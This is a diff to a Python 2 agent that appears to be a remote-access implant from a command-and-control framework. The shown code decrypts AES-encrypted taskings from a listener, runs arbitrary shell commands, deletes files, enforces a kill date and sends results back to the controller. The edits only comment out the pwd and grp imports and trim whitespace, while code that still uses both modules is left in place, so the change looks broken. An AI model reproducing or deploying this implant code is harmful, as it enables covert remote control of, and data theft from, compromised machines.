@@ -19,11 +19,11 @@ import imp
 import marshal
 import re
 import shutil
-import pwd
+#import pwd
 import socket
 import math
 import stat
-import grp
+#import grp
 from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
 from StringIO import StringIO
@@ -162,12 +162,12 @@ def build_response_packet(taskingID, packetData, resultID=0):
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
     resultID = struct.pack('=H', resultID)
-    
+
     if packetData:
         packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
-            
+
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
@@ -222,7 +222,7 @@ def process_tasking(data):
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
-        
+
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
 
@@ -242,7 +242,7 @@ def process_tasking(data):
                 resultPackets += result
 
             packetOffset += 12 + length
-        
+
         # send_message() is patched in from the listener module
         send_message(resultPackets)
 
@@ -287,7 +287,7 @@ def process_packet(packetType, data, resultID):
     elif packetType == 40:
         # run a command
         parts = data.split(" ")
-        
+
         if len(parts) == 1:
             data = parts[0]
             resultData = str(run_command(data))
@@ -541,7 +541,7 @@ _search_order = [('.py', False), ('/__init__.py', True)]
 class ZipImportError(ImportError):
     """Exception raised by zipimporter objects."""
 
-# _get_info() = takes the fullname, then subpackage name (if applicable), 
+# _get_info() = takes the fullname, then subpackage name (if applicable),
 # and searches for the respective module or package
 
 class CFinder(object):
@@ -918,7 +918,7 @@ def directory_listing(path):
         user = pwd.getpwuid(fstat.st_uid)[0]
         # Hotfix for windows
         if "windows" in OS_TYPE.lower():
-            group = 123    
+            group = 123
         else:
             group = grp.getgrgid(fstat.st_gid)[0]
 
@@ -941,7 +941,7 @@ def directory_listing(path):
 
 # additional implementation methods
 def run_command(command, cmdargs=None):
-    
+
     if re.compile("(ls|dir)").match(command):
         if cmdargs == None or not os.path.exists(cmdargs):
             cmdargs = '.'
@@ -953,7 +953,7 @@ def run_command(command, cmdargs=None):
     elif re.compile("rm").match(command):
         if cmdargs == None:
             return "please provide a file or directory"
-        
+
         if os.path.exists(cmdargs):
             if os.path.isfile(cmdargs):
                 os.remove(cmdargs)
@@ -981,7 +981,7 @@ def run_command(command, cmdargs=None):
     else:
         if cmdargs != None:
             command = "{} {}".format(command,cmdargs)
-        
+
         p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
         return p.communicate()[0].strip()
 
@@ -1030,7 +1030,7 @@ while(True):
                 killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
             except:
                 pass
-            
+
             if now >= killDateTime:
                 msg = "[!] Agent %s exiting" %(sessionID)
                 send_message(build_response_packet(2, msg))
@@ -1067,4 +1067,3 @@ while(True):
 
     except Exception as e:
         print "main() exception: %s" % (e)
-
